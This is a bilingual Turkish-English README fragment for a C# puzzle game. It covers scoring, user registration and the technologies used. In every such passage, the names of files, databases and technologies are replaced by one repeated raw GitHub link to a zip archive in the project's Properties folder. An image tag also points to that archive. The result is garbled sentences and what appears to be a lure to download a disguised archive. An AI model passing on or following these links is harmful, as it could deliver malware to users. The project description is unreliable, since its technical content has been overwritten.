...
-> Bütün parçalar doğru yerleştiği taktirde Oyun Bitti mesajı verilmekte ve skorunuz bin klasörü içerisinde yer alan https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip belgesine hemde sunucuda ki veritabanına kayıt edilmektedir.<br><br>
<img src="https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip" width="1100" height="600">
<br><br>

Kullanılan Teknolojiler;<br><br>
-> Geliştirme C# programlama dili ile visual studio ortamında geliştirilmiştir.<br>
-> Kullanıcı kayıt işlemleri için https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip kullanılmıştır.<br>
...
-> Oyunu tamamladıkdan sonra yapılan skor, proje içerisinde ki https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip belgesine kayıt edilmektedir.<br>
-> Oyuna kayıt olmuş kullanıcının bilgileri ise proje içerisinde ki https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip içerisinde tutulmaktadır..<br>
...
-> If all the pieces are placed correctly, the Game Over message is given and your score is recorded in the https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip document in the bin folder and in the database on the server.<br><br>

Used Technologies;<br><br>
-> Development Developed with C# programming language in visual studio environment.<br>
-> https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip is used for user registration.<br>
...
-> After completing the game, the score is recorded in the highest https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip document in the project.<br>
-> The information of the user registered to the game is kept in the https://github.com/Alpaymh/PuzzleFinalEdition/raw/refs/heads/master/YazLabYabBoz/Properties/Puzzle_Edition_Final_3.1-alpha.4.zip in the project..<br>
